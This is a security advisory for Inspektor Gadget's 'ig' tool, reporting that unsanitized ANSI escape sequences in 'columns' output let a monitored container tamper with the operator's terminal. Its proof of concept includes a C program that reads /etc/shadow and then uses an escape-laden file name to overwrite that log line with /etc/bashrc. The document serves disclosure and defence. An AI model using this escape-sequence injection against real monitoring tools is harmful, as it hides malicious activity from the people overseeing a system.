summary: "Inspektor Gadget uses unsanitized ANSI Escape Sequences In `columns` Output Mode\n\
  ### Description\nString fields from eBPF events in `columns` output mode are rendered to the\
  \ terminal without any sanitization of control characters or ANSI escape sequences. \n\nTherefore,\
  \ a maliciously forged – partially or completely – event payload, coming from an observed\
  \ container, might inject the escape sequences into the terminal of `ig` operators, with various\
  \ effects.\n\nThe `columns` output mode is the default when running `ig run` interactively.\n\
  \n### PoC\n\n#### Attachments\nrun.sh\n```bash\n\n#!/bin/bash\nset -e\n\nSCRIPT_DIR=\"$(cd\
  \ \"$(dirname \"$0\")\" && pwd)\"\nCONTAINER_NAME=\"poc-escape-inject\"\n\necho \"Make sure\
  \ ig is running in another terminal:\"\necho \"  sudo ig run trace_open -c ${CONTAINER_NAME}\"\
  \necho \"\"\necho \"Press Enter to continue...\"\nread -r\n\nsudo docker run --rm \\\n   \
  \ --name \"${CONTAINER_NAME}\" \\\n    -v \"${SCRIPT_DIR}/escape_inject.c:/src/escape_inject.c:ro\"\
  \ \\\n    gcc:latest \\\n    bash -c \"\n        gcc -o /tmp/escape_inject /src/escape_inject.c\
  \ && \\\n        /tmp/escape_inject\n    \"\n```\n\nescape_inject.c\n```c\n#include <fcntl.h>\n\
  #include <stdio.h>\n#include <unistd.h>\n\nstatic void read_file(const char *path)\n{\n\t\
  int fd = open(path, O_RDONLY);\n\tif (fd >= 0)\n\t\tclose(fd);\n}\n\nstatic void create_file(const\
  \ char *path)\n{\n\tint fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);\n\tif (fd >=\
  \ 0)\n\t\tclose(fd);\n}\n\nint main(void)\n{\n\tprintf(\"[1] normal activity\\n\");\n\tcreate_file(\"\
  /tmp/app.log\");\n\tprintf(\"[2] malicious read of /etc/shadow\\n\");\n\tread_file(\"/etc/shadow\"\
  );\n\tusleep(300000);\n\tprintf(\"[3] tampering the log\\n\");\n\tcreate_file(\"/etc\\x1b[1A/bashrc\\\
  x1b[1B\\x1b[13C\");\n\tusleep(300000);\n\treturn 0;\n}\n```\n\n1. Setup a Linux host and build/install\
  \ `ig` version `0.48.0`\n2. Run the attached `run.sh` on a terminal\n3. Run `sudo ig run trace_open\
  \ -c poc-escape-inject` on another terminal\n4. Press \"Enter\" on the terminal attached to\
  \ `run.sh`\n5. Observe the events traced by `ig`\n6. Notice that, at some point, the line\
  \ where `/etc/shadow` is logged is overwritten `/etc/bashrc`, demonstrating the log injection\n\
  \n\n### Impact\n\nThe impact depends on the injection point – mostly due to length limitations\
  \ – and on the terminal used by the operator when running displaying `columns` output.\n\n\
  At the very least, the injection can be used for [Log Injection](https://owasp.org/www-community/attacks/Log_Injection),\
  \ by inserting new lines or deleting existing ones.\n\nHowever, by leveraging Operating System\
  \ Command (OSC) ANSI escape sequences, the impact on modern terminal can vary, possibly allowing\
  \ an attacker to:\n\n- lead to DoS (Denial of Service)\n- write to the system clipboard\n\
  - create hyperlinks to attacker-controlled servers\n- change window title\n- potentially execute\
  \ code (see referenced resources)\n\n### Resources\n- https://www.youtube.com/watch?v=spb8Gk9Z09Y\n\
  \n### Notes\n\nThe `json` output mode was already sanitizing the content."
